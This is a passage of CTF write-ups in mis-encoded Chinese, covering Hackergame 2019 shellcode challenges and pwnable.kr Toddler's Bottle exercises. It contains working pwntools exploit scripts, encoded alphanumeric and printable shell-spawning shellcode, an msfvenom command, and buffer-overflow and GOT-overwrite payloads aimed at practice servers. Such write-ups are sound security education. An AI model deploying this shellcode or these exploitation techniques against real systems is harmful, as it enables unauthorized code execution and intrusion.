","date":"2019-10-15","objectID":"/hackergame2019/:8:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"å°å·§ç²ç‘çš„ ELF IDA æ‰“å¼€å‘ç°æœ‰ä¸€å †å­—ç¬¦ï¼Œç„¶åå¯¹è¾“å…¥è¿›è¡Œè¿ç®—åä¸è¿™ 45 ä¸ªå­—ç¬¦è¿›è¡Œæ¯”å¯¹ï¼Œä¸€è‡´åˆ™è¾“å‡º correctï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€†è¿ç®—å³å¯ï¼š v = [0x66,0x6E,0x65,0x6B,0x83,0x4E,0x6D,0x74,0x85,0x7A,0x6F,0x57,0x91,0x73,0x90,0x4F,0x8D,0x7F,0x63,0x36,0x6C,0x6E,0x87,0x69,0xA3,0x6F,0x58,0x73,0x66,0x56,0x93,0x9F,0x69,0x70,0x38,0x76,0x71,0x78,0x6F,0x63,0xC4,0x82,0x84,0xBE,0xBB,0xCD] for i in range(46): v[i] += i v[i] ^= i v[i] -= 2*i print(bytes(v)) ","date":"2019-10-15","objectID":"/hackergame2019/:9:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"Shell éª‡å®¢ ","date":"2019-10-15","objectID":"/hackergame2019/:10:0","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"1 åº”è¯¥è¯´æ˜¯å…¥é—¨ pwn é¢˜ï¼š // gcc -z execstack -fPIE -pie -z now chall1.c -o chall1 int main() { char buf[0x200]; read(0, buf, 0x200); ((void(*)(void))buf)(); } è¿™é‡Œå¯ä»¥ç›´æ¥æ‰§è¡Œç”¨æˆ·è¾“å…¥ï¼Œå› æ­¤åªéœ€è¦å†™å…¥ shellcode å³å¯ï¼š from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') # p = process('./chall1') p = remote('202.38.93.241', 10000) p.recvuntil(':') p.sendline('token') # token p.send(asm(shellcraft.sh())) p.interactive() ","date":"2019-10-15","objectID":"/hackergame2019/:10:1","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"2 // gcc -m32 -z execstack -fPIE -pie -z now chall2.c -o chall2 int main() { char buf[0x200]; int n, i; n = read(0, buf, 0x200); if (n \u003c= 0) return 0; for (i = 0; i \u003c n; i++) { if(!((buf[i] \u003e= 65 \u0026\u0026 buf[i] \u003c= 90) || (buf[i] \u003e= 48 \u0026\u0026 buf[i] \u003c= 57))) return 0; } ((void(*)(void))buf)(); } è¿™é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šé™åˆ¶äº†è¾“å…¥å­—ç¬¦å¿…é¡»æ˜¯å¤§å†™å­—æ¯æˆ–æ•°å­—ï¼Œå¹¶ä¸”æ˜¯åŸºäº x86 çš„ã€‚å¯ä»¥ç”¨ç±»ä¼¼ ALPHA3 çš„å·¥å…·å¯¹ shellcode è¿›è¡Œè½¬æ¢ã€‚å…ˆå°† shellcode å†™å…¥æ–‡ä»¶ï¼š from pwn import * with open('shellcode.bin', 'w') as f: f.write(asm(shellcraft.sh())) éšåä½¿ç”¨ ALPHA3 è¿›è¡Œè½¬åŒ–ï¼š $ py -2 ALPHA3.py x86 ascii uppercase eax --input=\"shellcode.bin\" å¾—åˆ°çš„ç»“æœå°±æ˜¯æ–°çš„ payloadã€‚ from pwn import * context.log_level = 'DEBUG' #p=process('./chall2') p = remote('202.38.93.241', 10002) p.recvuntil(':') p.sendline('token') # token p.send('PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06') p.interactive() çœ‹åˆ° flag åå‘ç°ï¼Œé¢„æœŸè§£æ˜¯åˆ©ç”¨ msfvenom ç”Ÿæˆ shellcodeï¼š $ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=\"/bin/sh\" -e x86/alpha_upper BufferRegister=eax ","date":"2019-10-15","objectID":"/hackergame2019/:10:2","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"3 // gcc -m64 -z execstack -fPIE -pie -z now chall3.c -o chall3 int main() { char buf[0x400]; int n, i; n = read(0, buf, 0x400); if (n \u003c= 0) return 0; for (i = 0; i \u003c n; i++) { if(buf[i] \u003c32 || buf[i] \u003e 126) return 0; } ((void(*)(void))buf)(); } æœ¬é¢˜çš„é™åˆ¶æ˜¯ shellcode ç”±å¯æ‰“å°å­—ç¬¦æ„æˆï¼Œä¸”åŸºäº x64 å¹³å°ã€‚è¿™ä¸ªä¼¼ä¹é  msfvenom å°±ä¸è¡Œäº†ï¼Œä½†æ˜¯å¯ä»¥æ¢ä¸ªå·¥å…·ï¼Œç”¨ shellcode_encoderï¼š $ python2 main.py shellcode.bin rax+29 å³å¯ç”Ÿæˆ payloadï¼Œæ›¿æ¢ç¬¬äºŒé¢˜çš„ payload å³å¯ã€‚æ³¨æ„ rax+29 æŒ‡ shellcode å¼€å§‹æ‰§è¡Œçš„ä½ç½®ã€‚ from pwn import * context(log_level='DEBUG') p = remote('202.38.93.241', 10004) #p=process('./chall3') p.recvuntil(':') p.sendline('token') # token p.send('''PPTAYAXVI31VXXXf-c?f-@`f-@`PZTAYAXVI31VXPP[_Hc4:14:SX-b+e2-( _`5\u003e??_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-IOF`-A`! 5\u003e_7;P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-\u003chh)-h` 5n???P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@{#'-ux @5O6?_P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-@#6p-B 0`5v?_?P^14:WX-????-}`aC-@`_}P_Hc4:14:SX-2 u@-\u0026@@ 5-_?wP^14:WX-????-}`aC-@`_}P_SX- ut*- ,Lv5X_?_P_Hc4:14:SX-Q !0-#@ 5s}.?P^14:WX-????-}`aC-@`_}P_SX-8 `$-%`\"|5?~}_P^SX-Ma`R-~c`p5-;?=P_AAAA!bt#MvAr*o$$\u003eI`_UXyyi;||s}_r=60d|jcEH(u'\u0026w6~7AM;wy4II+f'Gw+X#e0T|t30Q.$A\u003e6p?'B[A\u003czDBH)6f0Rj#XO$''') p.interactive() ","date":"2019-10-15","objectID":"/hackergame2019/:10:3","tags":["Javascript","æ•°å­¦","SSRF","æ•´æ•°æº¢å‡º","DNS","æ­£åˆ™è¡¨è¾¾å¼","å¤å…¸å¯†ç ä¸ç¼–ç "],"title":"Hackergame2019 æ¯”èµ›è®°å½•","uri":"/hackergame2019/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç”»é£å¾ˆå¯çˆ±çš„ Pwn é¢˜ç»ƒä¹ ç½‘ç«™ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:0:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fd #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003echar buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi(argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } è¿™é‡Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œç”¨å®ƒå‡å» 0x1234 åå¾—åˆ° fd ä¹Ÿå°±æ˜¯ Linux ä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶è¯»å–å¯¹åº”çš„æ–‡ä»¶åˆ° buf ä¸­ã€‚æˆ‘ä»¬å½“ç„¶å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æ§åˆ¶å…¶ fd æ¯”è¾ƒéº»çƒ¦ï¼›ä½†æˆ‘ä»¬çŸ¥é“ï¼ŒLinux ä¸‹æ ‡å‡†è¾“å…¥æµä¹Ÿæœ‰è‡ªå·±çš„ fdï¼Œå³ 0ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦ä¼ å…¥ 0x1234 çš„åè¿›åˆ¶å½¢å¼ 4660ï¼Œå¹¶åœ¨æ ‡å‡†è¾“å…¥ä¸­è¾“å…¥ LETMEWIN\\n å³å¯ï¼š $ ./fd 4660 LETMEWIN ","date":"2019-10-09","objectID":"/pwnkr-toddler/:1:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"collision #include \u003cstdio.h\u003e#include \u003cstring.h\u003eunsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u003c5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u003c2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } é¦–å…ˆè¦æ±‚è¾“å…¥ 20 å­—èŠ‚çš„å¯†ç ï¼ˆæ˜¾ç„¶æ˜¯ä¸ª char *ï¼‰ï¼Œç„¶åå°†å®ƒå¼ºåˆ¶è½¬æ¢ä¸º int * ç±»å‹ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ª char æ˜¯ 1 å­—èŠ‚ï¼Œè€Œä¸€ä¸ª int æ˜¯ 4 å­—èŠ‚ï¼Œå› æ­¤ 20 å­—èŠ‚çš„ char æ•°ç»„ä¼šå˜æˆ 5 ä¸ª int ç»„æˆçš„ int æ•°ç»„ã€‚ è¿™ 5 ä¸ª int ä¼šè¢«ç´¯åŠ ï¼Œç„¶åè¦æ±‚å…¶å’Œç­‰äº hashcodeã€‚æ¢è€Œè¨€ä¹‹éšä¾¿æ‰¾ 5 ä¸ªåŠ èµ·æ¥ç­‰äº hashcode çš„åå…­è¿›åˆ¶æ•°å°±è¡Œäº†ï¼š $ python -c 'print hex(0x21dd09ec-0x01010101*4)' 0x1dd905e8 $ ./col $(python -c'print \"\\xe8\\x05\\xd9\\x1d\"+\"\\x01\"*16') æ³¨æ„é»˜è®¤å°ç«¯æ³•è¡¨ç¤ºã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:2:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"bof #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003evoid func(int key){ char overflowme[32]; printf(\"overflow me :\"); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(\"/bin/sh\"); } else{ printf(\"Nah..\\n\"); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } ä» IDA ä¸­è§‚å¯Ÿåˆ° overflowme åœ¨ ebp-2cï¼Œè€Œ key åœ¨ ebp+8ï¼Œç›¸å·® 0x34ã€‚æ ˆä¸Šå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š HIGH ADDRESS ---------------------- | the states of main() | // caller ---------------------- | args of func() | // including key. Also in caller's state ---------------------- | retaddr of func() | ---------------------- | saved ebp | \u003c- ebp ---------------------- | local vars of func() | // including overflowme[] ---------------------- \u003c- esp LOW ADDRESS äº†è§£è¿™äº›åï¼Œæˆ‘ä»¬ç”¨ 0x34 å­—èŠ‚æ•°æ®ä½œå¡«å……ï¼Œç„¶åç”¨ 0xcafebabe è¦†ç›–æ‰ key å³å¯ã€‚ from pwn import * context.log_level = 'DEBUG' # p = process('./bof') p = remote('pwnable.kr', 9000) payload = 'a'*0x34 + p32(0xcafebabe) p.sendline(payload) p.interactive() ","date":"2019-10-09","objectID":"/pwnkr-toddler/:3:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"flag åœ¨ Hex-View ä¸­å‘ç°æ˜¯ UPX åŠ å£³çš„ï¼Œupx -d è„±å£³ã€‚ è„±å£³åçš„ç¨‹åºæç¤ºä¼š malloc ç„¶å strcpy æœ¬é¢˜çš„ flagï¼ŒæŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°è¿™é‡Œ flag çš„å˜é‡åæ˜¯ cs:flagï¼Œè·Ÿè¸ªå˜é‡å¾—åˆ° flagã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:4:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"passcode #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e void login(){ int passcode1; int passcode2; printf(\"enter passcode1 :\"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 :\"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name :\"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } ç›´æ¥è¾“å…¥ passcode çš„è¯ä¼šæ˜¾ç¤ºæ®µé”™è¯¯ï¼Œæ˜¾ç„¶æ˜¯å› ä¸ºä¸¤ä¸ª scanf éƒ½æ²¡æœ‰åœ¨å˜é‡å‰åŠ  \u0026ï¼Œç›´æ¥å¾€å˜é‡å€¼æ‰€ä»£è¡¨çš„åœ°å€ä¸Šå†™äº†ã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥é€‚å½“çš„ passcode æ¥æ§åˆ¶ä¸¤ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€ï¼Œä½¿å¾—ä»–ä»¬ç­‰äºé‚£ä¸¤ä¸ªæ•°å€¼ã€‚è€Œå­˜å‚¨é‚£ä¸¤ä¸ªæ•°å€¼çš„åœ°å€ï¼Œåªèƒ½æ¥è‡ªäºæˆ‘ä»¬è¾“å…¥çš„ nameã€‚ ç„¶è€Œè¿™ä¸¤ä¸ªæ•°å€¼ä»£è¡¨çš„åœ°å€æœªå¿…å¯å†™ï¼Œname å’Œä¸¤ä¸ª passcode ä¹Ÿä½äºä¸åŒæ ˆå¸§ï¼Œæ— æ³•ç¼“å†²åŒºæº¢å‡ºæ¥è¦†ç›–ã€‚åˆ°è¿™ä¸€æ­¥ä¼¼ä¹å¡ä½äº†ã€‚ä½†ç»è¿‡åæ±‡ç¼–å‘ç° name åœ¨ ebp-0x70ï¼Œpasscode1 åœ¨ ebp-0x10ï¼Œä¸¤è€…ç›¸å·® 96 å­—èŠ‚ä¸”ä½äºåŒä¸€æ ˆå¸§ï¼Œæ¢å¥è¯è¯´ name æ˜¯å¯ä»¥è¦†ç›– passcode1 çš„ï¼Œè¿™æ ·çœ‹ä¼¼ä¹åˆæœ‰å¸Œæœ›ã€‚ æ³¨æ„åˆ° login ä¸­ï¼Œscanf ç¬¬ä¸€æ¬¡åè°ƒç”¨äº† fflushã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘åˆ©ç”¨ scanf çš„å†™ç‰¹æ€§å†™ GOT è¡¨ï¼Œå› ä¸º GOT è¡¨è‚¯å®šæ˜¯å¯å†™çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆç”¨ fflush çš„ GOT åœ°å€ï¼ˆä¸æ­¢ fflushï¼Œç¨‹åºä¸­åŒ…å«çš„ GLIBC å‡½æ•°éƒ½è¡Œï¼‰è¦†ç›– passcode1 çš„å€¼ï¼Œç„¶åé€šè¿‡ scanf å¯¹ passcode1 çš„å€¼æ‰€ä»£è¡¨çš„åœ°å€ï¼ˆä¹Ÿå°±æ˜¯ fflush çš„ GOTï¼‰å†™å…¥ system(\"/bin/cat flag\") çš„åœ°å€ã€‚è¿™æ ·ç›¸å½“äºå°† fflush å‡½æ•°åŠ«æŒåˆ°äº† system(\"/bin/cat flag\") ä¸Šã€‚ objdump -R passcode å¯¼å‡ºç¨‹åºåŠ¨æ€é‡å®šå‘è¡¨ï¼Œæ‹¿åˆ° fflush çš„ GOT åœ°å€ 0804a004ï¼›ç„¶å gdb é‡Œ disas login æ‹¿åˆ° system(\"/bin/cat flag\") çš„åœ°å€ 080485e3ï¼Œæ³¨æ„è¿™ä¸ªåœ°å€å®é™…ä¸Šæ˜¯ call system çš„å‰ä¸€å¥ï¼šmovl $0x80487af,(%esp)ï¼Œä¹Ÿå°±æ˜¯å‡†å¤‡ system å‡½æ•°çš„å‚æ•°çš„è¯­å¥ã€‚æœ€åå‘ payloadï¼š $ python \u003e\u003e\u003e from pwn import * \u003e\u003e\u003e context.log_level = 'DEBUG' \u003e\u003e\u003e p = process('./passcode') \u003e\u003e\u003e p.sendline('a'*96+p32(0x0804a004)) \u003e\u003e\u003e p.sendline(str(0x080485e3)) \u003e\u003e\u003e p.interactive() éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œscanf çš„æ—¶å€™æ¥æ”¶ %dï¼Œå› æ­¤éœ€è¦ str ä¸€ä¸‹è½¬æˆåè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ æ³¨ï¼š GLIBC å‡½æ•°çš„ GOT åœ°å€ï¼Œåœ¨ pwntools ä¸­å¯ä»¥ç”¨ç±»ä¼¼ elf.got['fflush'] çš„æ–¹æ³•è·å¾—ï¼Œæ›´åŠ æ–¹ä¾¿ å¦‚æœå¼€å¯äº† PIE åˆ™éœ€è¦ leak å‡º GOT åœ°å€ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:5:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"random #include \u003cstdio.h\u003e int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if((key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } æˆ‘ä»¬éƒ½çŸ¥é“ C çš„ rand å‡½æ•°æ˜¯ä¼ªéšæœºï¼Œéšæœºæ€§å–å†³äº srand å‡½æ•°è®¾å®šçš„ç§å­ï¼Œè¿™ä¸ªç§å­é»˜è®¤ä¸º 1ã€‚å› æ­¤ random å˜é‡å®é™…ä¸Šæ˜¯å›ºå®šçš„ï¼Œåªè¦åœ¨æ ˆä¸ŠæŠŠä»–è¯»å‡ºæ¥å³å¯ã€‚ random æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œå¹¶ä¸”æ˜¯ unsigned intï¼Œå› æ­¤åº”è¯¥åœ¨ ebp-4 çš„ä½ç½® ã€‚æˆ‘ä»¬åœ¨æœ‰ deadbeef çš„é‚£è¡Œä¸‹æ–­ç‚¹ï¼Œéšä¾¿è¾“å…¥åï¼Œåœ¨ gdb ä¸­è¾“å…¥ x/8x $rbp-4ï¼Œå³å¯è¯»å–åˆ°ï¼š 0x7ffefe6d5d0c: 0x6b8b4567 0x00400670 0x00000000 0x4439d830 0x7ffefe6d5d1c: 0x00007f68 0x00000001 0x00000000 0xfe6d5df8 ä¹Ÿå°±æ˜¯è¯´ï¼Œ0x6b8b4567 å°±æ˜¯è¿™ä¸ª randomï¼Œæˆ‘ä»¬ç”±æ­¤å¯ä»¥ç®—å‡º key ä¸º 3039230856ã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:6:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"input éå¸¸å¥½ç©çš„ä¸€é¢˜ï¼Œæ¶µç›–äº† Linux ä¸‹å„ç§åŸºæœ¬çš„é€šä¿¡æ–¹å¼ã€‚ å…ˆè¯´ä¸€ä¸‹è¿™é¢˜çš„å‘ç‚¹ï¼š/home/input ä¸‹æˆ‘ä»¬æ²¡æœ‰å†™æƒé™ï¼Œè€Œ /tmp ç›®å½•ä¸‹æœ‰å†™æƒé™æ²¡æœ‰è¯»æƒé™ï¼Œæ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯åœ¨ /tmp ä¸‹æ–°å»ºä¸ªç›®å½•ï¼ŒæŠŠ flag è½¯é“¾æ¥ï¼ˆln -s /home/input2/flag ./flagï¼‰åˆ°è¿™ä¸ªç›®å½•é‡Œï¼Œè„šæœ¬æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹è¿è¡Œã€‚ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/socket.h\u003e#include \u003carpa/inet.h\u003e int main(int argc, char* argv[], char* envp[]){ printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf,\"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf,\"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if(fread(buf, 4, 1, fp)!=1 ) return 0; if(memcmp(buf,\"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons(atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)\u0026saddr, sizeof(saddr)) \u003c0){ printf(\"bind error, use another port\\n\"); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026caddr, (socklen_t*)\u0026c); if(cd \u003c 0){ printf(\"accept error, tell admin\\n\"); return 0; } if(recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf,\"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0; } å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰ 5 å…³ï¼š ç¬¬ä¸€å…³è¦æ±‚æœ‰ 100 ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œå…¶ä¸­ç¬¬ 64 ä¸ªæ˜¯ \\x00ï¼Œç¬¬ 65 ä¸ªæ˜¯ \\x20\\x0a\\x0dï¼› ç¬¬äºŒå…³åˆ†åˆ«ä»æ ‡å‡†è¾“å…¥å’Œæ ‡å‡†é”™è¯¯æµä¸­è¯»å–ï¼Œè¦æ±‚è¯»åˆ°çš„ä¿¡æ¯åˆ†åˆ«æ˜¯ \\x00\\x0a\\x00\\xff å’Œ \\x00\\x0a\\x00\\xffï¼Œç”±äºæˆ‘ä»¬æ— æ³•æ§åˆ¶æ ‡å‡†é”™è¯¯æµï¼Œå¯ä»¥é‡‡ç”¨ç®¡é“é‡å®šå‘çš„æ–¹å¼ï¼› ç¬¬ä¸‰å…³éœ€è¦æˆ‘ä»¬è®¾ç½®ç¯å¢ƒå˜é‡ \\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbeï¼› ç¬¬å››å…³è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œè¦æ±‚å‰å››ä¸ªå­—èŠ‚æ˜¯ \\x00\\x00\\x00\\x00ï¼› ç¬¬äº”å…³å»ºç«‹äº†ä¸€ä¸ª socketï¼Œç›‘å¬çš„ç«¯å£æ¥è‡ªç¬¬ 66 ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼Œä¸”æœŸæœ›æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯ \\xde\\xad\\xbe\\xefã€‚ ç¼–å†™ python è„šæœ¬ï¼š import os import subprocess import socket import time # stage 1 args = list(\"A\"*100) args[0] = \"/home/input2/input\" args[ord('A')] = \"\" args[ord('B')] = \"\\x20\\x0a\\x0d\" args[ord(\"C\")] = \"8080\" # stage 2 stdin_r, stdin_w = os.pipe() stderr_r, stderr_w = os.pipe() os.write(stdin_w,\"\\x00\\x0a\\x00\\xff\") os.write(stderr_w,\"\\x00\\x0a\\x02\\xff\") # stage 3 env = {\"\\xde\\xad\\xbe\\xef\": \"\\xca\\xfe\\xba\\xbe\"} # stage 4 with open(\"\\x0a\", \"wb\") as f: f.write(\"\\x00\"*4) # open a subprocess here because we need a server p = subprocess.Popen(args, stdin=stdin_r,stderr=stderr_r,env=env) # stage 5 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) time.sleep(1) # wait 4 server s.connect((\"127.0.0.1\", 8080)) s.send(\"\\xde\\xad\\xbe\\xef\") s.close() ","date":"2019-10-09","objectID":"/pwnkr-toddler/:7:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"leg #include \u003cstdio.h\u003e#include \u003cfcntl.h\u003eint key1(){ asm(\"mov r3, pc\\n\"); } int key2(){ asm( \"push {r6}\\n\" \"add r6, pc, $1\\n\" \"bx r6\\n\" \".code 16\\n\" \"mov r3, pc\\n\" \"add r3, $0x4\\n\" \"push {r3}\\n\" \"pop {pc}\\n\" \".code 32\\n\" \"pop {r6}\\n\" ); } int key3(){ asm(\"mov r3, lr\\n\"); } int main(){ int key=0; printf(\"Daddy has very strong arm! :\"); scanf(\"%d\", \u0026key); if((key1()+key2()+key3()) == key ){ printf(\"Congratz!\\n\"); int fd = open(\"flag\", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(\"I have strong leg :P\\n\"); } return 0; } åŒæ—¶ï¼Œæœ¬é¢˜ä¹Ÿç»™å‡ºäº†å¯¹åº”çš„ gdb åæ±‡ç¼–ç»“æœï¼Œæ˜¾ç„¶æ˜¯ arm æ±‡ç¼–æŒ‡ä»¤ã€‚å‚è€ƒ arm æ¶æ„ä¸‹ï¼š é‡‡ç”¨ RISC æŒ‡ä»¤é›† pc 